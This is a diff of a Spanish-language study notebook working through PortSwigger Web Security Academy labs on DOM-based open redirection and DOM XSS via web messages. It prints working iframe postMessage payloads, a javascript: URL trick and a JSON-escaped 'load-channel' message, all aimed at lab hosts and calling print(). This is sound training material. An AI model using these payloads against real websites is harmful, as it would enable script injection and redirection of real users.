@@ -200,15 +200,15 @@ Aquí lo interesante es
 Si ponemos un \delante de las comillas nos lo va a escapar también
 
 Voy a intentar
-
+```
 \" alert(1)}//
-
+```
 ![](assets/2022-07-13-20-56-14.png)
 
 Si vemos ahora nos lo ha escapado. Abajo aparece el espacio como un + por lo que en vez de espacio pondré un + en el search
-
+```
 \"+alert(1)}//
-
+```
 Y me lo ejecuta
 
 ![](assets/2022-07-13-20-57-38.png)
@@ -239,3 +239,240 @@ Si lo pongo dentro del comentario desaparece totalmente... pienso que puede esta
 Perfecto funciona, pero podría haber probado varias XD
 
 ![](assets/2022-07-13-21-11-08.png)
+
+## Lab: DOM-based open redirection
+
+This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.
+
+![](assets/2022-07-18-17-58-44.png)
+
+En el botón de back tiene esto
+
+![](assets/2022-07-18-18-03-13.png)
+
+```html
+<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+```
+Si vemos en el botón tiene que cuando le des a click va a ejecutar una redirección. El parámetro url lo podemos añadir a la url directamente. 
+
+Realmente me deja hasta ponerlo como url del usuario y no se porque no me soluciona el ejercicio pero bueno hacemos esto.
+
+![](assets/2022-07-18-18-05-52.png)
+
+```bash
+GET /post?postId=8&url=https://exploit-0ade009704032a92c098ffbd012a00f9.web-security-academy.net/exploit
+```
+![](assets/2022-07-18-18-06-34.png)
+
+## Lab: DOM XSS using web messages
+
+This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.
+
+Mapeando
+
+página principal 3 xss
+
+```html
+<!--Aparece un error al principio-->
+
+
+ <!-- Ads to be inserted here -->
+                    <div id='ads'>
+                    </div>
+                    <script>
+                        window.addEventListener('message', function(e) {
+                            document.getElementById('ads').innerHTML = e.data;
+                        })
+                    </script>
+```
+
+No aparece nada más a simple vista
+
+Este tipo de ataques pueden ser por pishing por lo que iremos al exploit
+
+Según los apuntes
+
+```html
+<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
+
+<iframe src="https://0a1a002203f1e380c0b1448100d800f1.web-security-academy.net/" onload="this.contentWindow.postMessage('print()','*')">
+
+```
+![](assets/2022-07-18-18-28-09.png)
+
+Lo he lanzado y veo el iframe por lo cual está funcionando... pero creo que habrá que obligar al error.
+
+Utilizamos lo títpico 
+```html
+<img src=1 onerror=print()>
+
+
+<iframe src="https://0a1a002203f1e380c0b1448100d800f1.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
+Ahora si me lo está lanzando
+
+![](assets/2022-07-18-18-30-24.png)
+
+Se lo mandamos a la victima
+
+![](assets/2022-07-18-18-32-55.png)
+
+## Lab: DOM XSS using web messages and a JavaScript URL
+
+This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
+
+- usar el redirection
+- usar javascript
+
+Nada más entrar me salta el chivato
+
+![](assets/2022-07-18-18-35-48.png)
+
+Aún así seguimos navegando
+
+![](assets/2022-07-18-18-37-27.png)
+
+```js
+<script>
+                        window.addEventListener('message', function(e) {
+                            var url = e.data;
+                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+                                location.href = url;
+                            }
+                        }, false);
+                    </script>
+```
+
+```js
+//Volvemos a usar nuestra base y cambiamos nuestro datos y como queremos ejecutarlo
+
+<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
+
+// según los apuntes dice que podemos ejecutar algo así como javascript:lo que queremos.
+
+<iframe src="https://exploit-0a9000100450093cc08a6661012f004a.web-security-academy.net/exploit" onload="this.contentWindow.postMessage('javascript:print()','*')">
+```
+```js
+// Ahora tenemos que lanzar el error. Según hemos visto que para que haga el location necesita un http o https... pero si es válido nos lo va a redireccionar a donde pongamos en vez de imprimir. Lo que hacemos es añadirlo y comentarlo.
+
+<iframe src="https://exploit-0a9000100450093cc08a6661012f004a.web-security-academy.net/exploit" onload="this.contentWindow.postMessage('javascript:print()//https','*')">
+```
+Lo mando pero no ejecuta nada
+
+![](assets/2022-07-18-18-46-20.png)
+
+Vuelvo a mirar el código y es que hay que poner https:
+```js
+<iframe src="https://exploit-0a9000100450093cc08a6661012f004a.web-security-academy.net/exploit" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
+```
+
+![](assets/2022-07-18-18-48-03.png)
+
+:(  ⛔️⛔️⛔️⛔️ Que no se esté viendo nada en el fondo también es otro síntoma de que algo está mal
+
+Llegados a este punto se me ocurre que o falta detrás del print() un ; o probar con el http: sin ser https
+
+```js
+<iframe src="https://exploit-0a9000100450093cc08a6661012f004a.web-security-academy.net/exploit" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
+Me acabo de dar cuenta que es posible que la url sea la de mi sitio. Pero no entiendo porque aunque esté llamando a exploit no me hace el print...
+
+```js
+<iframe src="https://0a11000d04dc095fc0f3668200500090.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
+
+![](assets/2022-07-18-18-52-25.png)
+
+⛔️⛔️⛔️⛔️ Importante
+
+> Es bastante importante saber lo que se hace porque fallos de sintaxis etc pueden pasar, pero si sabes que tenía que hacer al final se consigue.
+
+![](assets/2022-07-18-18-55-09.png)
+
+## Lab: DOM XSS using web messages and JSON.parse
+
+This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
+
+Empezamos con el mapeado
+
+![](assets/2022-07-18-19-23-02.png)
+
+![](assets/2022-07-18-19-23-35.png)
+
+```js
+   <script>
+                        window.addEventListener('message', function(e) {
+                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case "player-height-changed":
+                                    ACMEplayer.element.style.width = d.width + "px";
+                                    ACMEplayer.element.style.height = d.height + "px";
+                                    break;
+                            }
+
+```
+
+Realmente he estado mirando , intentando enviar mensajes por burp repeater pero como que no le veo una solución. 
+
+
+Tengo claro que la web escucha con el addevenlistener
+
+Tengo claro que que tiene que ser el load-channel porque asigna una url. Esa url siguiendo los apuntes y laboratorios anteriores tiene que ser javascript:print() para que se ejecute.
+
+Tengo claro que tengo que enviarlo por el exploit server
+
+Tengo claro que tengo que hacer qu eentre en el load-chanel y para eso tengo que enviar un json en el mensaje.
+
+Tambien tengo claro que hay que usar
+```html
+<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
+```
+Más o menos tengo claro que a la hora de poner los " va a dar problemas por lo que tendré que escaparlo.
+
+No tengo muy claro como añado el src del iframe. Es obvio que a acmeplayer.element.src= d.url es una url que está en el atributo del objeto d.
+
+Realmente creo que tengo la opción de crear en json un d.url=url que será el print, o url=url que será el print...
+
+Voy a probar ambos para ver que tal
+
+```html
+<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
+```
+
+Mirando en el dom me aparece 
+
+![](assets/2022-07-18-19-54-32.png)
+
+Voy a probar añadindo url o d.url por si pasa algo,pero lo haré con el channel, después de varios experimentos desisto y me pongo con lo que quería hacer antes.
+
+
+Haciendo las sustituciones que dije quedaría así con el antes del " . Parece que está bien escrito voy a probar
+
+He borrado varios intentos fallidos y he dejado solo el final. Solo tener en cuenta.
+
+He cambiado y dentro del onload he sustituido el " por un '. Y las ' que había dentro del postmessage las he sustituido por " . Básicamente un truco desde la unversidad. Eso si me quedó claro . Importante que se cambia a todo.
+
+>Por otra parte mucho cuidado al tener tantas comillas y barras inclinadas que a veces se pasan cosas tan tontas como que con las prisas puse : en vez de , entre los elementos del json y por consiguiente en el siguiente entre url y el javascript puse un =.... fallos muy muy tontos que si lo hubiese escrito bien antes de empezar a escapar me hubiese dado cuenta rápidamente.
+
+
+```html
+<iframe src='https://0a4500b7041835dec0e1867c00f20090.web-security-academy.net/' onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+```
+
+![](assets/2022-07-18-20-32-24.png)
+
+![](assets/2022-07-18-20-32-49.png)
+
+LABORATORIOS de manipulación de cookies	document.cookie
